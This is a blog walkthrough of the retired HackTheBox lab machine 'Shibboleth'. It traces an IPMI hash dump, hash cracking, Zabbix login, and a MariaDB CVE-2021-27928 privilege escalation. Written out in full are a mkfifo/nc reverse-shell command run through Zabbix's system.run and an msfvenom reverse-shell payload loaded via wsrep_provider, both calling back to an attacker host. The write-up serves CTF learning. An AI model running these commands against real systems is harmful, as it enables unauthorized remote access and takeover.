---
title: "HackTheBox: \"Shibboleth\" Walkthrough"
date: 2022-04-22
tags: ['hackthebox', 'ctf']
slug: "hackthebox-shibboleth-walkthrough"
draft: false
---

# Introduction

This is my first walkthrough for a HackTheBox machine. It's not the first
machine I've done, though. But as Shibboleth is now "retired", it is allowed
to publish walkthroughs. I have decided not to publish any passwords,
because that would spoil the fun (and not add anything in terms of learning).
I'll rather focus on my chain of thought to go through this challenge.

# Foothold

The very first scan on every machine I do is a port scan using nmap. Depending on
the results, I continue to directory and/or vhost (subdomain) scanning.

First an nmap scan only reveals `80/tcp` as an open port. I have yet to encounter a machine
where this port is not open, as every machine has some kind of "landing page".
In this case, where a tcp port scan does not reveal anything interesting,
it's not a bad idea to also scan udp ports:

```plain
Discovered open port 623/udp on 10.10.11.124
```

Now that's something! A quick search reveals that `623/udp` is the default port for IPMI,
which is some kind of remote management interface.

Searching a bit further, we find common vulnerabilities for IPMI. One that
sounds especially promising is dumping the hashes. Conveniently, the metasploit framework
comes with a payload for this task.

```plain
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:25b6d5c382010...
```

When obtaining a hash, and it's an "insecure" one (that is, not bcrypt or similar),
I put it into hashcat right away. In this case, we need to pick the right
hash type. My hashcat version suggested three, and `-m 7300` is the correct one in this case.
I'm using the "rockyou" wordlist, which also yields a result in this case.

Now we have a username and password, but what next? I tried playing around
with IPMI a bit more - there seem to be ways to get a reverse shell, but those
were not working with this IPMI instance.

But, we are also not done with scanning! Let's scan for vhosts next:

```plain
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]
```

Again, this looks promising. All vhosts point to the same Zabbix instance.
Let's login with the credentials we obtained earlier!

# User

We now have adminisrator access to Zabbix. The installed Zabbix version 5.0.17
does not have any known vulnerability. But, Zabbix is a monitoring software
and as such for sure has the capability to execute commands on the machines
it is monitoring. Time to RTFM :scream:

Under *Configuration > Items > Item types > Zabbix agent* we will find:
> `system.run[command,<mode>]` - Run specified command on the host.

Exactly what we are looking for! Note that this seems to be an intentional
misconfiguration on this machine, because the docs also say:

> All `system.run[*]` items (remote commands, scripts) are disabled by default, even when no deny keys are specified


We now know that we can create an "Item" for the `shibboleth.htb` host in
the Zabbix UI.
I tried a lot of different reverse shell commands until I finally found one which
was working in this context:

```plain
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f,nowait]
```

Click on *Test > Get Value and Test*. We now have a reverse shell for user `zabbix`.


```plain
$ id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Oct 16  2021 .
drwxr-xr-x 19 root     root     4096 Oct 16  2021 ..
drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Oct 16  2021 ipmi-svc

```

We also see the only entry in `/home` is for user `ipmi-svc`, so we now have to escalate to this
user. We *do* have a password, so try the straight-forward way:

```plain
$ su ipmi-svc
Password: <password>
id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

Done - we can read the user flag!

# Root

Our next step is to gain root access. If there is no obvious way forward,
running LinPEAS usually gives us a hint: On this machine, there is a config
file `/etc/zabbix/zabbix_server.conf`, which is owned by root - and readable by the current user!
In this file, we will find credentials for a database server. Let's try them out:


```plain
$ mysql -u zabbix -p<password> zabbix

MariaDB [zabbix]> select version();
+----------------------------------+
| version()                        |
+----------------------------------+
| 10.3.25-MariaDB-0ubuntu0.20.04.1 |
+----------------------------------+
1 row in set (0.000 sec)
```

Looking up vulnerabilities for this MariaDB version leads to `CVE-2021-27928`.
We can use metasploit again, this time to build a payload:

```plain
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4242 -f elf-so -o payload.so
```

Connect to the MariaDB server, execute the payload:

```plain
mysql -u zabbix -p<password> -e 'SET GLOBAL wsrep_provider="/tmp/payload.so";'
```

# Conclusion and Learnings

I really liked the Shibboleth machine. Probably because it wasn't "the usual
web stuff". Most of the time I needed was to understand
how Zabbix works, and then to get the reverse shell working. This is also
a key learning for me: If you "know" you are on the right track, but it's
not working, try another way. This machine was the first time I used
(and needed) a "mkfifo reverse shell". Furthermore, I learned about `msfvenom`.